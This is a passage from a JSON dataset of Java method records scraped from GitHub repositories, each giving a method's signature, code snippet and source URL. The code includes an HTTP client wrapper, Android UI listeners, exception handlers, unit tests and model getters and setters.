["AdapterClickListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOnClickListener(AdapterClickListener adapterClickListener) {\n        onClickListener = adapterClickListener;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/adapter/otc/FundRecordAdapter.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 31158, "method_name": "doGet", "class_name": "HttpClient", "params": ["String", "Map<String,String>"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String doGet(String url, Map<String, String> paraMap) {\n    CloseableHttpClient client = null;\n    CloseableHttpResponse response = null;\n    String result = null;\n    try {\n      client = HttpClients.createDefault();\n      URIBuilder uriBuilder = new URIBuilder(url);\n      uriBuilder.setParameters(convert(paraMap));\n      HttpGet httpGet = new HttpGet(uriBuilder.build());\n      httpGet.setConfig(getDefaultRequestConfig());\n      response = client.execute(httpGet);\n      if (HttpStatus.SC_OK == response.getStatusLine().getStatusCode()) {\n        HttpEntity entity = response.getEntity();\n        result = EntityUtils.toString(entity, UTF_8);\n      }\n    } catch (Exception e) {\n      LOG.error(e.getMessage());\n      e.printStackTrace();\n    } finally {\n      if (Objects.nonNull(response)) {\n        try {\n          response.close();\n        } catch (IOException e) {\n          e.printStackTrace();\n        }\n      }\n      if (Objects.nonNull(client)) {\n        try {\n          client.close();\n        } catch (IOException e) {\n          e.printStackTrace();\n        }\n      }\n    }\n    return result;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/http/HttpClient.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31159, "method_name": "doPost", "class_name": "HttpClient", "params": ["String", "Map<String,String>"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String doPost(String url, Map<String, String> paraMap) {\n    CloseableHttpClient client = HttpClients.createDefault();;\n    CloseableHttpResponse response = null;\n    String result = null;\n    try {\n      paraMap.put(\"api_version\",\"java-1.0.0\");\n      HttpPost httpPost = new HttpPost(url);\n      httpPost.setConfig(getDefaultRequestConfig());\n      httpPost.setEntity(new UrlEncodedFormEntity(convert(paraMap), UTF_8));\n      response = executeCircuitBreaker(\"Post service\", () -> {\n        try {\n          return client.execute(httpPost);\n        } catch (IOException e) {\n          e.printStackTrace();\n        }\n        return null;\n      }, null);\n      if (HttpStatus.SC_OK == response.getStatusLine().getStatusCode()) {\n        HttpEntity entity = response.getEntity();\n        result = EntityUtils.toString(entity, UTF_8);\n      }\n    } catch (Exception e) {\n      LOG.error(\">>>>>>> http get failed <<<<<<<<< \");\n      LOG.error(e.getMessage());\n      e.printStackTrace();\n    } finally {\n      if (Objects.nonNull(response)) {\n        try {\n          response.close();\n        } catch (IOException e) {\n          e.printStackTrace();\n        }\n      }\n      if (Objects.nonNull(client)) {\n        try {\n          client.close();\n        } catch (IOException e) {\n          e.printStackTrace();\n        }\n      }\n    }\n    return result;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/http/HttpClient.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31160, "method_name": "getDefaultRequestConfig", "class_name": "HttpClient", "params": [], "throws": null, "modifiers": ["private"], "return_type": "RequestConfig", "snippet": "  private RequestConfig getDefaultRequestConfig() {\n    return RequestConfig.custom()\n            .setConnectionRequestTimeout(CONNECTION_REQUEST_TIMEOUT)\n            .setSocketTimeout(SOCKET_TIMEOUT)\n            .build();\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/http/HttpClient.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31161, "method_name": "convert", "class_name": "HttpClient", "params": ["Map<String,String>"], "throws": null, "modifiers": ["private"], "return_type": "List<NameValuePair>", "snippet": "  private List<NameValuePair> convert(Map<String, String> paraMap) {\n    List<NameValuePair> nameValuePairs = new ArrayList<>();\n    if (ObjectUtils.isEmpty(paraMap)) {\n      return nameValuePairs;\n    }\n    Set<String> keySet = paraMap.keySet();\n    for (String key : keySet) {\n      nameValuePairs.add(new BasicNameValuePair(key, paraMap.get(key)));\n    }\n    return nameValuePairs;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/http/HttpClient.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31162, "method_name": "executeCircuitBreaker", "class_name": "HttpClient", "params": ["String", "Supplier<CloseableHttpResponse>", "Supplier<CloseableHttpResponse>"], "throws": null, "modifiers": ["private"], "return_type": "CloseableHttpResponse", "snippet": "  private CloseableHttpResponse executeCircuitBreaker(String circuitBreakerName, Supplier<CloseableHttpResponse> supplier, Supplier<CloseableHttpResponse> fallback){\n    CircuitBreaker circuitBreaker = CircuitBreaker.ofDefaults(circuitBreakerName);\n    Supplier<CloseableHttpResponse> decoratedSupplier = CircuitBreaker.decorateSupplier(circuitBreaker, supplier);\n    Retry retry = Retry.ofDefaults(circuitBreakerName);\n    Supplier<CloseableHttpResponse> retrySupplier = Retry.decorateSupplier(retry, decoratedSupplier);\n    if( fallback == null){\n      return Try.ofSupplier(retrySupplier).get();\n    }else {\n      return Try.ofSupplier(retrySupplier).recover(e -> {\n        LOG.warn(String.format(\"Service %s is not available, calling fallback!\", circuitBreakerName));\n        return fallback.get();\n      }).get();\n    }\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/http/HttpClient.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31163, "method_name": "handler404", "class_name": "DefaultExceptionHandler", "params": ["NotFoundException"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String handler404(NotFoundException e) {\n        return \"erreur-404\";\n    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/main/java/fr/gouv/interieur/dmgp/remettant/application/ui/DefaultExceptionHandler.java", "stars": "5", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31164, "method_name": "handler400", "class_name": "DefaultExceptionHandler", "params": ["InvalidParameterException"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String handler400(InvalidParameterException e) {\n        LOGGER.error(\"Param\u00e8tre utilisateur incorrecte\", e);\n        return \"erreur-400\";\n    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/main/java/fr/gouv/interieur/dmgp/remettant/application/ui/DefaultExceptionHandler.java", "stars": "5", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31165, "method_name": "defaultErrorHandler500", "class_name": "DefaultExceptionHandler", "params": ["Exception"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String defaultErrorHandler500(Exception e) {\n        LOGGER.error(\"Erreur durant la distribution des masques\", e);\n        return \"erreur-500\";\n    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/main/java/fr/gouv/interieur/dmgp/remettant/application/ui/DefaultExceptionHandler.java", "stars": "5", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31166, "method_name": "test_\uc0ac\uc6a9\uc790\ubaa9\ub85d\uc870\ud68c", "class_name": "TestUserDaoService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void test_\uc0ac\uc6a9\uc790\ubaa9\ub85d\uc870\ud68c() {\n        List<User> list = service.getUserList();\n        assertEquals(3, list.size(),\n                \"\ucd08\uae30 \uc0ac\uc6a9\uc790\ub294 3\uba85\uc774\uc5b4\uc57c \ud569\ub2c8\ub2e4.\");\n    }", "url": "https://raw.githubusercontent.com/joneconsulting/springbootproject/master/src/test/java/com/example/demo/dao/TestUserDaoService.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31167, "method_name": "test_\uc0ac\uc6a9\uc790\uc815\ubcf4\ud655\uc778", "class_name": "TestUserDaoService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void test_\uc0ac\uc6a9\uc790\uc815\ubcf4\ud655\uc778() {\n        User user = service.getUserList().get(0);\n        assertTrue(user.getId() == 1);\n    }", "url": "https://raw.githubusercontent.com/joneconsulting/springbootproject/master/src/test/java/com/example/demo/dao/TestUserDaoService.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31168, "method_name": "test_\uc0ac\uc6a9\uc790\uc870\ud68c", "class_name": "TestUserDaoService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void test_\uc0ac\uc6a9\uc790\uc870\ud68c() {\n        User user = service.getUser(Integer.valueOf(1));\n        assertNotNull(user);\n        assertEquals(1, user.getId(),\n                \"\uc0ac\uc6a9\uc790 ID\uac00 \uc798\ubabb\ub418\uc5c8\uc2b5\ub2c8\ub2e4.\");\n    }", "url": "https://raw.githubusercontent.com/joneconsulting/springbootproject/master/src/test/java/com/example/demo/dao/TestUserDaoService.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31169, "method_name": "onRssiFailure", "class_name": "BleRssiCallback", "params": ["BleException"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void onRssiFailure(BleException exception);\n\n    public abstract void onRssiSuccess(int rssi);\n\n}\n", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/callback/BleRssiCallback.java", "stars": "2", "class_props": {"extends": "BleBaseCallback", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31170, "method_name": "onRssiSuccess", "class_name": "BleRssiCallback", "params": ["int"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void onRssiSuccess(int rssi);\n\n}\n", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/callback/BleRssiCallback.java", "stars": "2", "class_props": {"extends": "BleBaseCallback", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31171, "method_name": "onPanelClosed", "class_name": "SlidingPaneLayout_PanelSlideListenerImplementor", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onPanelClosed (android.view.View p0)\n\t{\n\t\tn_onPanelClosed (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v4/widget/SlidingPaneLayout_PanelSlideListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31172, "method_name": "n_onPanelClosed", "class_name": "SlidingPaneLayout_PanelSlideListenerImplementor", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onPanelClosed (android.view.View p0);\n\n\n\tpublic void onPanelOpened (android.view.View p0)\n\t{\n\t\tn_onPanelOpened (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v4/widget/SlidingPaneLayout_PanelSlideListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31173, "method_name": "onPanelOpened", "class_name": "SlidingPaneLayout_PanelSlideListenerImplementor", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onPanelOpened (android.view.View p0)\n\t{\n\t\tn_onPanelOpened (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v4/widget/SlidingPaneLayout_PanelSlideListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31174, "method_name": "n_onPanelOpened", "class_name": "SlidingPaneLayout_PanelSlideListenerImplementor", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onPanelOpened (android.view.View p0);\n\n\n\tpublic void onPanelSlide (android.view.View p0, float p1)\n\t{\n\t\tn_onPanelSlide (p0, p1);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v4/widget/SlidingPaneLayout_PanelSlideListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31175, "method_name": "onPanelSlide", "class_name": "SlidingPaneLayout_PanelSlideListenerImplementor", "params": ["android", "float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onPanelSlide (android.view.View p0, float p1)\n\t{\n\t\tn_onPanelSlide (p0, p1);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v4/widget/SlidingPaneLayout_PanelSlideListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31176, "method_name": "n_onPanelSlide", "class_name": "SlidingPaneLayout_PanelSlideListenerImplementor", "params": ["android", "float"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onPanelSlide (android.view.View p0, float p1);\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v4/widget/SlidingPaneLayout_PanelSlideListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31177, "method_name": "monodroidAddReference", "class_name": "SlidingPaneLayout_PanelSlideListenerImplementor", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v4/widget/SlidingPaneLayout_PanelSlideListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31178, "method_name": "monodroidClearReferences", "class_name": "SlidingPaneLayout_PanelSlideListenerImplementor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v4/widget/SlidingPaneLayout_PanelSlideListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31179, "method_name": "getTorrents", "class_name": "Episode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Torrents", "snippet": "    public Torrents getTorrents() {\n        return torrents;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31180, "method_name": "setTorrents", "class_name": "Episode", "params": ["Torrents"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTorrents(Torrents torrents) {\n        this.torrents = torrents;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31181, "method_name": "getWatched", "class_name": "Episode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Watched", "snippet": "    public Watched getWatched() {\n        return watched;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31182, "method_name": "setWatched", "class_name": "Episode", "params": ["Watched"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setWatched(Watched watched) {\n        this.watched = watched;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31183, "method_name": "getFirstAired", "class_name": "Episode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getFirstAired() {\n        return firstAired;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31184, "method_name": "setFirstAired", "class_name": "Episode", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setFirstAired(int firstAired) {\n        this.firstAired = firstAired;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31185, "method_name": "isDateBased", "class_name": "Episode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isDateBased() {\n        return dateBased;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31186, "method_name": "setDateBased", "class_name": "Episode", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDateBased(boolean dateBased) {\n        this.dateBased = dateBased;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31187, "method_name": "getOverview", "class_name": "Episode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getOverview() {\n        return overview;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31188, "method_name": "setOverview", "class_name": "Episode", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOverview(String overview) {\n        this.overview = overview;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31189, "method_name": "getTitle", "class_name": "Episode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getTitle() {\n        return title;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31190, "method_name": "setTitle", "class_name": "Episode", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTitle(String title) {\n        this.title = title;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31191, "method_name": "getEpisode", "class_name": "Episode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getEpisode() {\n        return episode;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31192, "method_name": "setEpisode", "class_name": "Episode", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setEpisode(int episode) {\n        this.episode = episode;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31193, "method_name": "getSeason", "class_name": "Episode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getSeason() {\n        return season;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31194, "method_name": "setSeason", "class_name": "Episode", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSeason(int season) {\n        this.season = season;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31195, "method_name": "getTvdbId", "class_name": "Episode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getTvdbId() {\n        return tvdbId;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31196, "method_name": "setTvdbId", "class_name": "Episode", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTvdbId(int tvdbId) {\n        this.tvdbId = tvdbId;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31197, "method_name": "init", "class_name": "SampleVideo", "params": ["Context"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void init(Context context) {\n        super.init(context);\n        initView();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 31198, "method_name": "initView", "class_name": "SampleVideo", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void initView() {\n        mMoreScale = (TextView) findViewById(R.id.moreScale);\n        mSwitchSize = (TextView) findViewById(R.id.switchSize);\n        mChangeRotate = (TextView) findViewById(R.id.change_rotate);\n        mChangeTransform = (TextView) findViewById(R.id.change_transform);\n\n        //\u5207\u6362\u6e05\u6670\u5ea6\n        mMoreScale.setOnClickListener(new OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                if (!mHadPlay) {\n                    return;\n                }\n                if (mType == 0) {\n                    mType = 1;\n                } else if (mType == 1) {\n                    mType = 2;\n                } else if (mType == 2) {\n                    mType = 3;\n                } else if (mType == 3) {\n                    mType = 4;\n                } else if (mType == 4) {\n                    mType = 0;\n                }\n                resolveTypeUI();\n            }\n        });\n\n        //\u5207\u6362\u89c6\u9891\u6e05\u6670\u5ea6\n        mSwitchSize.setOnClickListener(new OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                showSwitchDialog();\n            }\n        });\n\n        //\u65cb\u8f6c\u64ad\u653e\u89d2\u5ea6\n        mChangeRotate.setOnClickListener(new OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                if (!mHadPlay) {\n                    return;\n                }\n                if ((mTextureView.getRotation() - mRotate) == 270) {\n                    mTextureView.setRotation(mRotate);\n                    mTextureView.requestLayout();\n                } else {\n                    mTextureView.setRotation(mTextureView.getRotation() + 90);\n                    mTextureView.requestLayout();\n                }\n            }\n        });\n\n        //\u955c\u50cf\u65cb\u8f6c\n        mChangeTransform.setOnClickListener(new OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                if (!mHadPlay) {\n                    return;\n                }\n                if (mTransformSize == 0) {\n                    mTransformSize = 1;\n                } else if (mTransformSize == 1) {\n                    mTransformSize = 2;\n                } else if (mTransformSize == 2) {\n                    mTransformSize = 0;\n                }\n                resolveTransform();\n            }\n        });\n\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 31199, "method_name": "onSurfaceSizeChanged", "class_name": "SampleVideo", "params": ["Surface", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onSurfaceSizeChanged(Surface surface, int width, int height) {\n        super.onSurfaceSizeChanged(surface, width, height);\n        resolveTransform();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 31200, "method_name": "onSurfaceAvailable", "class_name": "SampleVideo", "params": ["Surface"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onSurfaceAvailable(Surface surface) {\n        super.onSurfaceAvailable(surface);\n        resolveRotateUI();\n        resolveTransform();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 31201, "method_name": "resolveTransform", "class_name": "SampleVideo", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void resolveTransform() {\n        switch (mTransformSize) {\n            case 1: {\n                Matrix transform = new Matrix();\n                transform.setScale(-1, 1, mTextureView.getWidth() / 2, 0);\n                mTextureView.setTransform(transform);\n                mChangeTransform.setText(\"\u5de6\u53f3\u955c\u50cf\");\n                mTextureView.invalidate();\n            }\n            break;\n            case 2: {\n                Matrix transform = new Matrix();\n                transform.setScale(1, -1, 0, mTextureView.getHeight() / 2);\n                mTextureView.setTransform(transform);\n                mChangeTransform.setText(\"\u4e0a\u4e0b\u955c\u50cf\");\n                mTextureView.invalidate();\n            }\n            break;\n            case 0: {\n                Matrix transform = new Matrix();\n                transform.setScale(1, 1, mTextureView.getWidth() / 2, 0);\n                mTextureView.setTransform(transform);\n                mChangeTransform.setText(\"\u65cb\u8f6c\u955c\u50cf\");\n                mTextureView.invalidate();\n            }\n            break;\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 31202, "method_name": "setUp", "class_name": "SampleVideo", "params": ["List<SwitchVideoModel>", "boolean", "String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean setUp(List<SwitchVideoModel> url, boolean cacheWithPlay, String title) {\n        mUrlList = url;\n        return setUp(url.get(mSourcePosition).getUrl(), cacheWithPlay, title);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 31203, "method_name": "setUp", "class_name": "SampleVideo", "params": ["List<SwitchVideoModel>", "boolean", "File", "String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean setUp(List<SwitchVideoModel> url, boolean cacheWithPlay, File cachePath, String title) {\n        mUrlList = url;\n        return setUp(url.get(mSourcePosition).getUrl(), cacheWithPlay, cachePath, title);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 31204, "method_name": "getLayoutId", "class_name": "SampleVideo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getLayoutId() {\n        return R.layout.sample_video;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 31205, "method_name": "startWindowFullscreen", "class_name": "SampleVideo", "params": ["Context", "boolean", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "GSYBaseVideoPlayer", "snippet": "    public GSYBaseVideoPlayer startWindowFullscreen(Context context, boolean actionBar, boolean statusBar) {\n        SampleVideo sampleVideo = (SampleVideo) super.startWindowFullscreen(context, actionBar, statusBar);\n        sampleVideo.mSourcePosition = 